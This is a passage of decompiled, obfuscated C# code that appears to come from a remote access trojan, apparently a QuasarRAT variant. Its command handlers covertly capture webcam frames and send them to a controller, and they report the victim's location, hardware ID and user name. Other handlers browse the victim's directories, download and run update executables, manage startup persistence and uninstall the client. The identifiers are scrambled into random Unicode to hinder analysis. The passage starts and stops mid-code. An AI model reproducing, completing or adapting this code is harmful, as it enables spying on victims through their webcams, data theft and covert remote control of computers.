    foreach (FilterInfo filterInfo in (CollectionBase) new 䓡赻庯䁔䅿\uE713괞ቝ㬑\u29C9ퟂ슢̔丶᪷蔘槵䛘縅\uF1C7(掓鹑㾝\uFFFDۇ悈\uE11F\u2666鏰ᠺ佶\uF4F8ŉ쿝琿Ⴟ㥸\uEE5C伱쯊.띯檠初䖈艰籷柑볤\uE352懝뱃ᰳ홒㞾蠞돪윖蛸\uF4BF元))
    {
      List<Size> sizeList = new List<Size>();
      foreach (\uE7FA\uFF5D逸䤈䡜蛷\uF717\u3309ﱈ䠎\uFFFD碛湺欘ቓ躪항睾㰲\uF5BB videoCapability in new VideoCaptureDevice(filterInfo.MonikerString).VideoCapabilities)
        sizeList.Add(videoCapability.\uA62C荭ﺬ럌浊坫鬇\uF54F戗焹\uF27D睾ࠁ委砆\uA6F7釼惡鰿\u27C7);
      webcams.Add(filterInfo.Name, sizeList);
    }
    if (webcams.Count <= 0)
      return;
    new GetWebcamsResponse(webcams).Execute(client);
  }

  public static void \u2140ꐔ䵙筙ȇ\uFDE9\uEE85뛶\u278E\uE4FF얹㖶හ뺢\uF670䛩ﬆ꽯ⷽ땲(
    GetWebcam command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.涤\u21EF럦푹픓쀤呢ﵭ跚羶饝䂺\uFFE2\uE718櫩廿楫葐\uFFFD䓄 = client;
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u0D78ㅔ췿썭㣵ﰴ쟟냅\uF0B0꺈\u32C5Ȧ踏裓\uE532寄뫚듪Ṏ\u2EB6 = true;
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.銤ﳡ썋㺟嶡\u265DꎻႢ呑㼍\uFFFDϡ궗\u00BFꠌ\uF3B9\uE6C7珦\uFFFD鱚 = command.Webcam;
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.쫴발ʅ뱪ㄱ뉏䱄㙢射馦\uE122縲獬鶻栤\uE3D9㲱淦쾏ဉ = command.Resolution;
    if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uEEE2芰嫪\uF6FF薱\uF0C9\uFFD1\uFFFD谮䄈前캌핷\u2F2E赦껀駹餼䫴ᬍ)
      return;
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ = new VideoCaptureDevice(new 䓡赻庯䁔䅿\uE713괞ቝ㬑\u29C9ퟂ슢̔丶᪷蔘槵䛘縅\uF1C7(掓鹑㾝\uFFFDۇ悈\uE11F\u2666鏰ᠺ佶\uF4F8ŉ쿝琿Ⴟ㥸\uEE5C伱쯊.띯檠初䖈艰籷柑볤\uE352懝뱃ᰳ홒㞾蠞돪윖蛸\uF4BF元)[command.Webcam].MonikerString);
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ.NewFrame += new 봛㵅퉽\uEEA8\uF430ꗉ㮩ᇨ赧쮬鏭缪ଂ燞슐汎\uF35E扷䇓\uE49F(匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.룦謒\u2420ᶡ\uFFFDお\u2E8D彣మ\uE03E煌\uED1C毶耹㩽\u3365\uE766閤쟷ꛃ);
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ.VideoResolution = 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ.VideoCapabilities[command.Resolution];
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ.Start();
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uEEE2芰嫪\uF6FF薱\uF0C9\uFFD1\uFFFD谮䄈前캌핷\u2F2E赦껀駹餼䫴ᬍ = true;
  }

  public static void ₜ扜\u0E4F\uE370\uF5BFୢ檦Ҽ렽챁쥹矑잯Ῥ\u21DC슨\u256F懂卆燛(
    DoWebcamStop command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u0D78ㅔ췿썭㣵ﰴ쟟냅\uF0B0꺈\u32C5Ȧ踏裓\uE532寄뫚듪Ṏ\u2EB6 = false;
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uEEE2芰嫪\uF6FF薱\uF0C9\uFFD1\uFFFD谮䄈前캌핷\u2F2E赦껀駹餼䫴ᬍ = false;
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.涤\u21EF럦푹픓쀤呢ﵭ跚羶饝䂺\uFFE2\uE718櫩廿楫葐\uFFFD䓄 = (鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨) null;
    if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ == null)
      return;
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ.NewFrame -= new 봛㵅퉽\uEEA8\uF430ꗉ㮩ᇨ赧쮬鏭缪ଂ燞슐汎\uF35E扷䇓\uE49F(匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.룦謒\u2420ᶡ\uFFFDお\u2E8D彣మ\uE03E煌\uED1C毶耹㩽\u3365\uE766閤쟷ꛃ);
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ.Stop();
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ = (VideoCaptureDevice) null;
  }

  private static void 룦謒\u2420ᶡ\uFFFDお\u2E8D彣మ\uE03E煌\uED1C毶耹㩽\u3365\uE766閤쟷ꛃ(
    object sender,
    \uF02D縣涢秌\uF7E4桬㹃恹릵㫥뙡\uE766ᣝ扉䨈㪛퐿㕞꾬ሁ e)
  {
    if (!匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uEEE2芰嫪\uF6FF薱\uF0C9\uFFD1\uFFFD谮䄈前캌핷\u2F2E赦껀駹餼䫴ᬍ)
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.Ꮀꀄ\uFD4A\uF066끍\uFFFDȂ\u1A1E萧티殃鄡ￄ㯝抉\u2856䟙䓻鹎ꐝ.Stop();
    if (!匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u0D78ㅔ췿썭㣵ﰴ쟟냅\uF0B0꺈\u32C5Ȧ踏裓\uE532寄뫚듪Ṏ\u2EB6)
      return;
    using (MemoryStream memoryStream = new MemoryStream())
    {
      ((Image) e.Frame.Clone()).Save((Stream) memoryStream, ImageFormat.Bmp);
      new GetWebcamResponse(memoryStream.ToArray(), 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.銤ﳡ썋㺟嶡\u265DꎻႢ呑㼍\uFFFDϡ궗\u00BFꠌ\uF3B9\uE6C7珦\uFFFD鱚, 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.쫴발ʅ뱪ㄱ뉏䱄㙢射馦\uE122縲獬鶻栤\uE3D9㲱淦쾏ဉ).Execute(匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.涤\u21EF럦푹픓쀤呢ﵭ跚羶饝䂺\uFFE2\uE718櫩廿楫葐\uFFFD䓄);
      memoryStream.Close();
    }
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u0D78ㅔ췿썭㣵ﰴ쟟냅\uF0B0꺈\u32C5Ȧ踏裓\uE532寄뫚듪Ṏ\u2EB6 = false;
  }

  public static void ᔫ饛椱莙乷䟀急嗓獉\uFFFD䴬㸿劽菆嗚㵍铡娈鶋䅰(
    GetAuthentication command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    ꃞВἘ\u1C38\uF8ACፁ췦\u2330穙힢馚淢်渡ꭱ\u1C87䬪筣곺\uFFFD.\uF0EC\u277D襯㵰枃\u0D5C쮭\u2E07풞\uE59A䴽㻴ꪖ倩煽䃽㘋絭\uFFFD쮷();
    new GetAuthenticationResponse(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ͺ\uFE5D撆ᓸ伕譢䧢쪷ລ肕灁\u28C8쀃ꗓ펵\u2578\uE8CE塺逓绤, 㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.FullName, \uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.頵ޔ혜श谧\uF32Bꉘ蒃ﾇ諽緃騨啋䕇䥔\u2F82\u0FF5雋顃ᓌ(), ꃞВἘ\u1C38\uF8ACፁ췦\u2330穙힢馚淢်渡ꭱ\u1C87䬪筣곺\uFFFD.GeoInfo.Country, ꃞВἘ\u1C38\uF8ACፁ췦\u2330穙힢馚淢်渡ꭱ\u1C87䬪筣곺\uFFFD.GeoInfo.CountryCode, ꃞВἘ\u1C38\uF8ACፁ췦\u2330穙힢馚淢်渡ꭱ\u1C87䬪筣곺\uFFFD.GeoInfo.Region, ꃞВἘ\u1C38\uF8ACፁ췦\u2330穙힢馚淢်渡ꭱ\u1C87䬪筣곺\uFFFD.GeoInfo.City, ꃞВἘ\u1C38\uF8ACፁ췦\u2330穙힢馚淢်渡ꭱ\u1C87䬪筣곺\uFFFD.ImageIndex, 톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.HardwareId, \uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.䝩傷攍䘴꾳\uFFFDꀷᎆ뒂戕䔬용蛞Ḧᴡ䑌껠畒軔놕(), 祙黓䏹蚓帹띣瓷뽥癚毭㛈钮ฑ玿缱䩾泰䐥坎况.깩\u1AFF\uEB42倃坄㖇\uF4F2겸甖멥ဣ䏾\uF348Ἰ\uF494铀옘妼\uF254\uFAF7(), 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ߟⴗ递鬁平仨\u2733ᮣ㶊뜨뗈엹\uE630쮓璗䉗\u23AA嶜\uFFFD꽽).Execute(client);
    if (!보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.AddToStartupFailed)
      return;
    Thread.Sleep(2000);
    new SetStatus("Adding to startup failed.").Execute(client);
  }

  public static void 냓䰗煅\uEE20乁ꪻ\uFFFD鄔獉畓Ⳍ\uF356禛\uF0E9\u0B0E적\uFFFDＱ\uE2A1\uF533(
    DoClientUpdate command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯\u0EF6튋\uF559筆㭬\u22CB\uABFC 墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬 = new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯\u0EF6튋\uF559筆㭬\u22CB\uABFC();
    // ISSUE: reference to a compiler-generated field
    墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.丆搣㨗橳ꨍ凌勷\uF107聻ﴺ眅\uEDCD辇䋗出赼閶\uF45F\uFFFD似 = client;
    // ISSUE: reference to a compiler-generated field
    墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3 = command;
    // ISSUE: reference to a compiler-generated field
    if (string.IsNullOrEmpty(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.DownloadURL))
    {
      // ISSUE: reference to a compiler-generated field
      if (!匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.ContainsKey(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.ID))
      {
        // ISSUE: reference to a compiler-generated field
        匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.Add(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.ID, \uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.\uFFFD\u33F3웍֓蹚\uF347댷랣\uE02A輶卯ί\u323F煭촥뫢\uE32F\uFFFD왜㳺(".exe"));
      }
      // ISSUE: reference to a compiler-generated field
      string str = 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57[墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.ID];
      try
      {
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        if (墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.CurrentBlock == 0 && !\uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.碤퉠㝌颺갔\uE687\u0B4E럻娜㰰\uF102ㅪ읶\uF731暦鼂缈ﰔ㾼\u2BEF(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.Block))
          throw new Exception("No executable file");
        \u181Fዱↂ突\uAB0F廠\u2454륫\u26F9㠂䒖\u0FEB慥䡋\uEC55磺扩썜ﺤ梘 ዱↂ突廠륫㠂䒖慥䡋磺扩썜ﺤ梘 = new \u181Fዱↂ突\uAB0F廠\u2454륫\u26F9㠂䒖\u0FEB慥䡋\uEC55磺扩썜ﺤ梘(str);
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        if (!ዱↂ突廠륫㠂䒖慥䡋磺扩썜ﺤ梘.먯熚䀍\uE766ᖌ㜰垺ƛ䋽㟎ꝷ\uF2AE탛Ї复샆\uE763ষ䤌랶(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.Block, 墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.CurrentBlock))
          throw new Exception(ዱↂ突廠륫㠂䒖慥䡋磺扩썜ﺤ梘.LastError);
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        if (墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.CurrentBlock + 1 != 墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.MaxBlocks)
          return;
        // ISSUE: reference to a compiler-generated field
        if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.ContainsKey(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.ID))
        {
          // ISSUE: reference to a compiler-generated field
          匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.Remove(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.ID);
        }
        // ISSUE: reference to a compiler-generated field
        new SetStatus("Updating...").Execute(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.丆搣㨗橳ꨍ凌勷\uF107聻ﴺ眅\uEDCD辇䋗出赼閶\uF45F\uFFFD似);
        // ISSUE: reference to a compiler-generated field
        擐ࣹ齃㟢\uE833Ủ欱⃧葵\uF779\uE72F\uF091ⲁ옳즣㤑솙튞汮밳.\uFFFD쵡㚦\uFD43銙\u33E2ꞡख괉茶೧ﲃ\u2AAF㴉\u203Bꭣ䇽荂섾줇(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.丆搣㨗橳ꨍ凌勷\uF107聻ﴺ眅\uEDCD辇䋗出赼閶\uF45F\uFFFD似, str);
      }
      catch (Exception ex)
      {
        // ISSUE: reference to a compiler-generated field
        if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.ContainsKey(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.ID))
        {
          // ISSUE: reference to a compiler-generated field
          匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.Remove(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u23FA띒\uEB8B캕㙭\uAB6A잁禰꼟愇\uFFFD㨔㵦\uE3F3ಷ\uE553緃呫앩\uEBD3.ID);
        }
        洈如ӏĢ묰\uE91B뎼腾\u066Cᓾ欐뽏粑ﮛ廻魪\u2974龬㰺㯦.䙁ڑ엶錄啳뒂겻蔺筃䡍וּ\uF35Eꑺ隁续\uFFFD춨埿䍳⃜(str);
        // ISSUE: reference to a compiler-generated field
        new SetStatus(string.Format("Update failed: {0}", (object) ex.Message)).Execute(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.丆搣㨗橳ꨍ凌勷\uF107聻ﴺ眅\uEDCD辇䋗出赼閶\uF45F\uFFFD似);
      }
    }
    else
    {
      // ISSUE: reference to a compiler-generated method
      new Thread(new ThreadStart(墯苍㠋섻涌켰쬳崔烘ꥂ헁ѝ疯튋筆㭬.\u2370\u2754ᥱ᳐ⱗ\uECA1䓱홗\uECAC\uF766ᬶ㜶믋癲\u23E9鏼ꘁ鎍簬羄)).Start();
    }
  }

  public static void 昳됬苕ᮤ\u28F2ᙕ䶤足ᵙ顠틂䯻壞ྉ诐䧨に䉕ꈔⲜ(
    DoClientUninstall command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    new SetStatus("Uninstalling... bye ;(").Execute(client);
    ꉋ㾠\u29E8啬ȧߩ\uEB90\u2CE7\u2697䡍\uF6AE쁜ឣ\uF498簦ô㧳ꬆ\u32A2㢛.旜㼗㨙쉭谛메ᧉ\uE733싰幣聓졄\uF121쳽㣊鼱\u2249遭暳뢒(client);
  }

  public static void 緲捝\uA4B0뻫蝏晽ꖃ唃\uEAD0鶳੮淑Ēኔ㕬ៈ每V亖轢(
    GetDirectory command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.㚸췛쀎︁\u1943\u22D4ﴫࡎ魔\uFD4A᳔ʕ\uE357漼\uE7BE\uF749\uF4D5ⶹüꂡ 㚸췛쀎︁ﴫࡎ魔᳔ʕ漼ⶹüꂡ = new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.㚸췛쀎︁\u1943\u22D4ﴫࡎ魔\uFD4A᳔ʕ\uE357漼\uE7BE\uF749\uF4D5ⶹüꂡ();
    // ISSUE: reference to a compiler-generated field
    㚸췛쀎︁ﴫࡎ魔᳔ʕ漼ⶹüꂡ.\uFFFD敍ሷ\uEEF7띫ਮ\uEE81蟽쁊日䙅ျ킀䚺\uF5EB얩ꉩ廀嘓ⵕ = false;
    // ISSUE: reference to a compiler-generated field
    㚸췛쀎︁ﴫࡎ魔᳔ʕ漼ⶹüꂡ.\uAA4F\uAAF8耜\u29AD䚍鴘ݧ帩崅窐몖鼦Ⲧ\u284B\uFFFD繷刞怓匳蹛 = (string) null;
    // ISSUE: reference to a compiler-generated method
    Action<string> action = new Action<string>(㚸췛쀎︁ﴫࡎ魔᳔ʕ漼ⶹüꂡ.係ꢇ뻉鱆ꄽ在졒졌鍂Ж\u2743鏊況\u0C7D\u0AFB멉\uF895用랉㻪);
    try
    {
      DirectoryInfo directoryInfo1 = new DirectoryInfo(command.RemotePath);
      FileInfo[] files1 = directoryInfo1.GetFiles();
      DirectoryInfo[] directories = directoryInfo1.GetDirectories();
      string[] files2 = new string[files1.Length];
      long[] filessize = new long[files1.Length];
      string[] folders = new string[directories.Length];
      int index1 = 0;
      foreach (FileInfo fileInfo in files1)
      {
        files2[index1] = fileInfo.Name;
        filessize[index1] = fileInfo.Length;
        ++index1;
      }
      if (files2.Length == 0)
      {
        files2 = new string[1]{ "$E$" };
        filessize = new long[1];
      }
      int index2 = 0;
      foreach (DirectoryInfo directoryInfo2 in directories)
      {
        folders[index2] = directoryInfo2.Name;
        ++index2;
      }
      if (folders.Length == 0)
        folders = new string[1]{ "$E$" };
      new GetDirectoryResponse(files2, folders, filessize).Execute(client);
    }
    catch (UnauthorizedAccessException ex)
    {
      action("GetDirectory No permission");
    }
    catch (SecurityException ex)
    {
      action("GetDirectory No permission");
    }
    catch (PathTooLongException ex)
    {
      action("GetDirectory Path too long");
    }
    catch (DirectoryNotFoundException ex)
    {
      action("GetDirectory Directory not found");
    }
    catch (FileNotFoundException ex)
    {
      action("GetDirectory File not found");
    }
    catch (IOException ex)
    {
      action("GetDirectory I/O error");
    }
    catch (Exception ex)
    {
      action("GetDirectory Failed");
    }
    finally
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      if (㚸췛쀎︁ﴫࡎ魔᳔ʕ漼ⶹüꂡ.\uFFFD敍ሷ\uEEF7띫ਮ\uEE81蟽쁊日䙅ျ킀䚺\uF5EB얩ꉩ廀嘓ⵕ && !string.IsNullOrEmpty(㚸췛쀎︁ﴫࡎ魔᳔ʕ漼ⶹüꂡ.\uAA4F\uAAF8耜\u29AD䚍鴘ݧ帩崅窐몖鼦Ⲧ\u284B\uFFFD繷刞怓匳蹛))
      {
        // ISSUE: reference to a compiler-generated field
        new SetStatusFileManager(㚸췛쀎︁ﴫࡎ魔᳔ʕ漼ⶹüꂡ.\uAA4F\uAAF8耜\u29AD䚍鴘ݧ帩崅窐몖鼦Ⲧ\u284B\uFFFD繷刞怓匳蹛, true).Execute(client);
      }
    }
  }

  public static void \u0FF2᳐噜戠ᵮⳖ\u0EFDꋼ찢㞐정ᇏ\u291C惒\u21BAぼ\uF6D8鑀뵤\uE3FF(
    DoDownloadFile command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.꽋秼肾\u201F㭓殘\uEDC5銤皡ष\u2204㹜\uF638쌖ʖ庬辰䞦\u20B3\uF5F2()
    {
      췰\uEF80뾴ꃫ㔍痥㺞\uECAC\uABFE\u251A㚰倳䜢ዬ飸뱴䝧\u278A悦\uECE3 = command,
      쁂飖暷홟\uED33냩䏟邱\u3204碭ཿ蚈女铝\u0D53川\u26F6軣\uE8D7\uE57E = client
    }.\uE20C뒀矜䕫ㄾ㗸춋꽦쳞倯蠟ᶥꋍର芛홧ⶼ鰴麷៝)).Start();
  }

  public static void 鲕\uFFFD\u2A62쁚鳉봖럌랩\uE271䖹륓怦嵣曑廓숋ᶱŔ\u27C9䔇(
    DoDownloadFile command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.䕤龩\uE8E7媟ᬩ앬暬\uEA4Eễ\u001D\uF2D8㒁簼솭ᖗቇ㹙䖗胊큑()
    {
